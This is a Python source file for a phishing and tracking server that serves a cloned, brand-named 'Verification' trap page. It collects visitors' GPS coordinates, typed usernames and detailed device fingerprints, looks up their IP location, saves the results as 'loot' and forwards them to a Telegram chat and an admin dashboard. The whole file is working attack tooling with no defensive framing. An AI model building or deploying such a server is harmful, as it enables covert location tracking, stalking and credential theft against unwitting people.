import json
import http.server
import socketserver
import urllib.request
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from logger import AuditLogger
from database import DatabaseManager
from colors import Colors
from cloner import TemplateCloner
from admin import (
    ADMIN_COOKIE,
    AdminDashboard,
    EventBuffer,
    build_auth_cookie,
    generate_token,
    parse_cookies,
    tokens_match,
)


def _safe_print(*args, **kwargs):
    """Console print that never breaks request handling on narrow encodings.

    Box-drawing log lines fail on Windows cp1252 consoles, which used to
    abort /collect with HTTP 500 *before* the hit was stored. Fall back to
    ASCII-escaped output instead.
    """
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        try:
            safe = " ".join(
                str(a).encode("ascii", "backslashreplace").decode() for a in args
            )
            print(safe, **kwargs)
        except Exception:
            pass


class AuraHandler(http.server.SimpleHTTPRequestHandler):
    redirect_url = "https://google.com"
    brand_name = "Verification"
    telegram_token = None
    telegram_chat_id = None
    admin_token = None
    admin_enabled = True
    events = EventBuffer()

    def log_message(self, format, *args):
        pass

    # ---------- admin helpers ----------

    def _parsed(self):
        try:
            u = urlparse(self.path)
            return u.path.rstrip("/") or "/", parse_qs(u.query)
        except Exception:
            return "/", {}

    def _is_admin(self):
        if not getattr(AuraHandler, "admin_enabled", True):
            return False
        expected = getattr(AuraHandler, "admin_token", None)
        if not expected:
            return False
        cookies = parse_cookies(self.headers.get("Cookie"))
        return tokens_match(cookies.get(ADMIN_COOKIE), expected)

    def _send_json(self, obj, status=200):
        try:
            body = json.dumps(obj).encode("utf-8")
        except Exception:
            body = b"{}"
            status = 500
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def _send_html(self, html, status=200, extra_headers=None):
        body = html.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra_headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def _redirect(self, location, clear_cookie=False):
        self.send_response(302)
        self.send_header("Location", location)
        self.send_header("Cache-Control", "no-store")
        if clear_cookie:
            self.send_header("Set-Cookie", build_auth_cookie("", clear=True))
        self.end_headers()

    def _read_body(self, limit=262144):
        try:
            length = int(self.headers.get("Content-Length", 0))
        except (TypeError, ValueError):
            return b""
        if length <= 0 or length > limit:
            return b""
        try:
            return self.rfile.read(length)
        except Exception:
            return b""

    # ---------- GET ----------

    def do_GET(self):
        try:
            path, query = self._parsed()

            if path in ("/admin/login",):
                self._send_html(AdminDashboard.render_login_page())
                return

            if path in ("/admin/logout",):
                self._redirect("/admin/login", clear_cookie=True)
                return

            if path in ("/admin",):
                if not self._is_admin():
                    self._redirect("/admin/login")
                    return
                self._send_html(AdminDashboard.render_panel_page())
                return

            if path == "/api/hits":
                if not self._is_admin():
                    self._send_json({"error": "unauthorized"}, status=401)
                    return
                qtype = (query.get("type", [""])[0] or "").upper()
                if qtype not in ("GEOLOCATION", "DEEP_TELEMETRY"):
                    qtype = None
                try:
                    limit = int(query.get("limit", ["100"])[0])
                except (TypeError, ValueError):
                    limit = 100
                hits = DatabaseManager.fetch_recent_hits(limit=limit, hit_type=qtype)
                self._send_json({"hits": hits})
                return

            if path == "/api/events":
                if not self._is_admin():
                    self._send_json({"error": "unauthorized"}, status=401)
                    return
                try:
                    since = int(query.get("since", ["0"])[0])
                except (TypeError, ValueError):
                    since = 0
                try:
                    limit = int(query.get("limit", ["100"])[0])
                except (TypeError, ValueError):
                    limit = 100
                self._send_json({"events": AuraHandler.events.fetch(since_id=since, limit=limit)})
                return

            if path == "/api/stats":
                if not self._is_admin():
                    self._send_json({"error": "unauthorized"}, status=401)
                    return
                stats = DatabaseManager.get_hit_stats()
                self._send_json(stats)
                return

            if path.startswith("/admin") or path.startswith("/api/"):
                self._send_json({"error": "not found"}, status=404)
                return

            # Default: public trap page (existing behavior).
            client_ip = self.client_address[0]
            current_time = datetime.now().strftime('%H:%M:%S')
            _safe_print(f"{Colors.GREY}[{current_time}] {Colors.CYAN}[*] Connection inbound from IP: {Colors.BOLD}{client_ip}{Colors.RESET}")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # Generate dynamic template based on user choice
            rendered = TemplateCloner.generate_template(AuraHandler.brand_name, AuraHandler.redirect_url)
            self.wfile.write(rendered.encode('utf-8'))
        except Exception:
            pass

    # ---------- POST ----------

    def _handle_admin_login(self):
        raw = self._read_body()
        token = ""
        try:
            body = json.loads(raw.decode("utf-8") or "{}")
            token = str(body.get("token", ""))
        except Exception:
            try:
                form = parse_qs(raw.decode("utf-8", "ignore"))
                token = str(form.get("token", [""])[0])
            except Exception:
                token = ""
        expected = getattr(AuraHandler, "admin_token", None)
        if expected and tokens_match(token.strip(), expected):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Set-Cookie", build_auth_cookie(expected))
            self.end_headers()
            try:
                self.wfile.write(b'{"ok": true}')
            except Exception:
                pass
        else:
            self._send_json({"error": "invalid token"}, status=401)

    def _handle_admin_logout(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Set-Cookie", build_auth_cookie("", clear=True))
        self.end_headers()
        try:
            self.wfile.write(b'{"ok": true}')
        except Exception:
            pass

    def do_POST(self):
        path, _ = self._parsed()

        if path == "/admin/login":
            self._handle_admin_login()
            return

        if path == "/admin/logout":
            self._handle_admin_logout()
            return

        if self.path != '/collect' and path != "/collect":
            self.send_response(404)
            self.end_headers()
            return

        try:
            client_ip = self.client_address[0]
            forwarded = self.headers.get('X-Forwarded-For')
            if forwarded:
                client_ip = forwarded.split(',')[0].strip()

            content_len = int(self.headers.get('Content-Length', 0))
            if not content_len:
                self.send_response(400)
                self.end_headers()
                return

            body = json.loads(self.rfile.read(content_len).decode('utf-8'))
            msg_type = body.get('type')
            current_time = datetime.now().strftime('%H:%M:%S')

            if msg_type == 'status':
                status_msg = body.get('message')
                _safe_print(f"{Colors.GREY}[{current_time}] {Colors.YELLOW}[LIVE ACTIVITY] ({client_ip}) -> {Colors.WHITE}{status_msg}{Colors.RESET}")
                AuraHandler.events.push("status", status_msg, client_ip)

            elif msg_type == 'geo':
                lat = body.get('lat')
                lon = body.get('lon')
                acc = body.get('acc')
                ip_intel = self.get_ip_intel(client_ip)
                maps_link = f"https://www.google.com/maps?q={lat},{lon}"

                _safe_print(f"\n{Colors.GREEN}{Colors.BOLD}[+] TARGET GPS CAPTURED SUCCESSFULLY!{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── IP Intel    : {Colors.WHITE}{ip_intel}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Latitude    : {Colors.RED}{lat}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Longitude   : {Colors.RED}{lon}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Accuracy    : {Colors.YELLOW}{acc} meters{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} └── Google Maps : {Colors.UNDERLINE}{Colors.YELLOW}{maps_link}{Colors.RESET}\n")

                report = f"[+] TARGET GPS: {lat}, {lon} | IP: {client_ip}\nMaps: {maps_link}"
                AuditLogger.save_loot(report)
                DatabaseManager.log_hit(client_ip, "GEOLOCATION", json.dumps(body), maps_link)
                AuditLogger.send_alert(report, None, AuraHandler.telegram_token, AuraHandler.telegram_chat_id)
                AuraHandler.events.push("geo", f"GPS {lat},{lon} (±{acc}m)", client_ip)

            elif msg_type == 'fingerprint':
                ip_intel = self.get_ip_intel(client_ip)
                input_usr = body.get('inputUser', 'N/A')
                _safe_print(f"\n{Colors.MAGENTA}{Colors.BOLD}[+] DEEP TELEMETRY & CREDENTIALS RECEIVED!{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Input User  : {Colors.GREEN}{input_usr}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── IP Intel    : {Colors.WHITE}{ip_intel}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Platform    : {Colors.WHITE}{body.get('platform')} (Lang: {body.get('lang')}){Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Client Hints: {Colors.WHITE}{body.get('clientHints')}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Orientation : {Colors.WHITE}{body.get('orientation')}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Hardware    : {Colors.WHITE}{body.get('cores')} Cores | RAM: {body.get('ram')} GB{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Storage     : {Colors.WHITE}{body.get('storage')}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Battery     : {Colors.WHITE}{body.get('battery')}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} ├── Network     : {Colors.WHITE}{body.get('network')}{Colors.RESET}")
                _safe_print(f"{Colors.CYAN} └── GPU Renderer: {Colors.WHITE}{body.get('gpu')}{Colors.RESET}\n")

                report = f"""
[+] DEEP TELEMETRY HIT: {client_ip}
Input Username: {input_usr}
Platform: {body.get('platform')} | TZ: {body.get('tz')}
Client Hints: {body.get('clientHints')}
Orientation: {body.get('orientation')}
Hardware: {body.get('cores')} Cores | RAM: {body.get('ram')} GB
GPU: {body.get('gpu')}
Battery: {body.get('battery')} | Net: {body.get('network')}
"""
                AuditLogger.save_loot(report.strip())
                DatabaseManager.log_hit(client_ip, "DEEP_TELEMETRY", json.dumps(body), ip_intel)
                AuditLogger.send_alert(report.strip(), None, AuraHandler.telegram_token, AuraHandler.telegram_chat_id)
                AuraHandler.events.push("fingerprint", f"Telemetry from {input_usr} ({body.get('platform')})", client_ip)

            self.send_response(200)
            self.end_headers()
        except Exception as e:
            _safe_print(f"{Colors.RED}[!] Error processing POST request: {e}{Colors.RESET}")
            try:
                self.send_response(500)
                self.end_headers()
            except Exception:
                pass

    def get_ip_intel(self, ip):
        try:
            if ip in ("127.0.0.1", "::1", "localhost"):
                return "Localhost / Private IP"
            url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp"
            req = urllib.request.Request(url, headers={'User-Agent': 'AuraTrace-Intel'})
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode())
                if data.get('status') == 'success':
                    return f"{data.get('city')}, {data.get('country')} | ISP: {data.get('isp')}"
        except Exception:
            pass
        return "Unknown ISP/Location"


class AuraServerManager:
    @staticmethod
    def start_server(port, brand_name, redirect_output, tg_token=None, tg_chat_id=None,
                     admin_token=None, enable_admin=True):
        DatabaseManager.init_db()
        AuraHandler.brand_name = brand_name
        AuraHandler.redirect_url = redirect_output
        AuraHandler.telegram_token = tg_token
        AuraHandler.telegram_chat_id = tg_chat_id
        AuraHandler.admin_enabled = enable_admin
        AuraHandler.events = EventBuffer()
        if enable_admin:
            AuraHandler.admin_token = admin_token or generate_token()
        else:
            AuraHandler.admin_token = None

        server = socketserver.ThreadingTCPServer(("", port), AuraHandler)
        return server
